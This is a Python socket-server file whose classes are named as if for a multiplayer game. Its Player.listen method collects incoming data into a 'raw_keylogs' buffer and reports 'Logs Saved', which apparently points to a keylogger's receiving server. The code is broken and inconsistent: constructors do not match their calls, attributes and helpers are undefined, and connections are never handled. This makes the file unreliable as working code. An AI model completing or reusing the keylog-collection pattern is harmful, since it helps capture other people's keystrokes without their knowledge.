import socket
import threading



class Game:
    pass


class Player:
    alive = True
    def __init__(self, pid):
        self.__pid = pid
        
    def listen(self):
        while self.alive:
            try:
                data = self.session.recv(1024)
                if data:
                    self.raw_keylogs += data.decode()
            except socket.error as exc:
                interface.message("DISCONNECT", f"Session {self.session_id} ({self.address[0]}:{self.address[1]}) - Logs Saved", colour=Fore.BLUE, line_break=True)
                if self.alive:
                    self.kill()

class ConnectionHandler:
    _running = False
    def __init__(self, host, port):
        self._host = host
        self._port = port
        
        
    def _gateway(self, con_socket: socket.socket):
        self._running = True
        SERVER.message("ConnectionHandler", "Listening on {}:{}".format(*con_socket.getsockname()))
        
        while self._running:
            (client, client_address) = con_socket.accept()
            SERVER.message("ConnectionHandler", "Connection from {}:{}".format(*client.getpeername()))
            
    
    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self._host, self._port))
        s.listen()
        
        gateway = threading.Thread(target=self._gateway, args=[s])
        gateway.start()

        

class Server:
    __games = []
    __clients = []
    __next_id = 1
    def __init__(self, host, port):
        self.__connection_handler = ConnectionHandler(host, port)
        
    
    @staticmethod
    def message(prefix, message):
        print(f"[{prefix}] {message}")
        
    
    
    def add_client(self, client):
        self.__clients.append(Player(self.__next_id, client)) 
        
    
        
        
    
    def start(self):
        self.__connection_handler.start()




def main():
    global SERVER
    SERVER = Server("0.0.0.0", 5555)
    SERVER.start()
    


if __name__ == "__main__":
    main()